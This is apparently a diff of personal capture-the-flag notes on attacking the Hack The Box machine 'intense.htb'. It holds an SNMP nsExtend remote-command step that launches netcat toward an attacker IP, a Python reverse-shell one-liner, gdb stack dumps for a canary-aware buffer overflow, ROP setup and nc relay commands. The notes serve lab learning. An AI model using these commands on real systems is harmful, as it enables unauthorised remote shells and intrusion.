@@ -136,9 +136,134 @@ UDP 38060 port is open
 def need a shell...
 https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e
 
-snmpset -m +NET-SNMP-EXTEND-MIB -v 1 -c SuP3RPrivCom90 intense.htb 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = /bin/nc 'nsExtendArgs."command"' = "10.10.14.33 1337"
-snmpwalk -v 1 -c SuP3RPrivCom90 intense.htb nsExtendObjects
+use one_shot_rce.sh
+perform command:  snmpset -m +NET-SNMP-EXTEND-MIB -v 1 -c SuP3RPrivCom90 intense.htb 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = /bin/nc 'nsExtendArgs."command"' = "10.10.14.33 1337"
   ^
   /usr/bin/python3
   ^^
   -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.33",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+see command:  see command:  see command:  see command:  see command:  see command:  see command:  see command:  see command:  snmpwalk -v 1 -c SuP3RPrivCom90 intense.htb nsExtendObjects
+
+upgrade shell: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+gcc
+  -Wall
+  -pie
+  -fPIE
+  -fstack-protector-all
+  -D_FORTIFY_SOURCE=2
+  -Wl,-z,now
+  -Wl,-z,relro
+
+echo bytes to exploit: echo -e '\x01'
+
+################################################################################
+gdb'in
+################################################################################
+0x7fffffffdf50: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdf58: 0x61    0x61    0x61    0x61    0x69    0x7f    0x00    0x00
+^ end of note buffer
+
+0x7fffffffdf60: 0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
+^
+some other variable
+
+0x7fffffffdf68: 0x00    0xfd    0xbb    0x68    0x1e    0x98    0x67    0xc7
+^ i think stack canary
+
+0x7fffffffdf70: 0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
+^ ebp
+
+0x7fffffffdf78: 0x6d    0x57    0x55    0x55    0x55    0x55    0x00    0x00
+^ return pointer we want to smash
+
+################################################################################
+gdb'in
+################################################################################
+0x7fffffffdf50: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdf58: 0x61    0x61    0x61    0x61    0x69    0x7f    0x00    0x00
+^ eob
+
+0x7fffffffdf60: 0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
+^ other variable
+
+0x7fffffffdf68: 0x00    0xfd    0xbb    0x68    0x1e    0x98    0x67    0xc7
+^ stack canary
+
+0x7fffffffdf70: 0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
+^ ebp
+
+0x7fffffffdf78: 0x6d    0x57    0x55    0x55    0x55    0x55    0x00    0x00
+^ ret
+
+CANARIES ARE SAME! FORK DOESNT CHANGE THE CANARY VALUE!
+0x7fffffffdf68: 0x00    0xfd    0xbb    0x68    0x1e    0x98    0x67    0xc7
+0x7fffffffdf68: 0x00    0xfd    0xbb    0x68    0x1e    0x98    0x67    0xc7
+
+################################################################################
+localproof
+################################################################################
+0x61    0x61    0x61    0x61    0xde    0xad    0xbe    0xef
+61      61      61      61      ad      de      ef      be EOB
+
+0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
+e0      70      ff      ff      7f      ff      00      00 some variable
+
+0x00    0xaf    0x1d    0xa2    0x5b    0x3d    0x7a    0x3e
+af      00      a2      1d      3d      5b      3e      7a canary
+
+0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
+e0      70      ff      ff      7f      ff      00      00 ebp
+
+0x6d    0x57    0x55    0x55    0x55    0x55    0x00    0x00
+57      6d      55      55      55      55      00      00 return
+
+################################################################################
+localproof
+################################################################################
+0x61    0x61    0x61    0x61    0xde    0xad    0xbe    0xef
+6161 6161 adde efbe
+
+0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
+e070 ffff 7fff 0000
+
+0x00    0x9b    0x62    0xa1    0x21    0x8d    0x37    0x22
+9b00 a162 8d21 2237
+
+0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
+e070 ffff 7fff 0000
+
+0x6d    0x57    0x55    0x55    0x55    0x55    0x00    0x00
+576d 5555 5555 0000
+
+0x58    0xe1    0xff    0xff    0xff    0x7f    0x00    0x00
+e158 ffff 7fff 0000
+
+wget my script onto server | hex to see canary
+
+################################################################################
+# local stack execution?
+################################################################################
+STACK IS NOT EXECUTABLE (RW), YOU MUST ROP:
+$readelf -f <file>
+GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+               0x0000000000000000 0x0000000000000000  RW     0x10
+
+################################################################################
+ROP
+################################################################################
+set up to give input:
+  mkfifo yourfifo
+  cat > yourfifo &
+  mypid=$!
+  yourprogram < yourfifo
+
+reverse tcp with nc:
+  nc -lvp 1337 -c "nc 127.0.0.1 5001" < attack
+
+write into the connection:
+  nc -lvp 1337 -c "nc 127.0.0.1 5001"
+
+
+
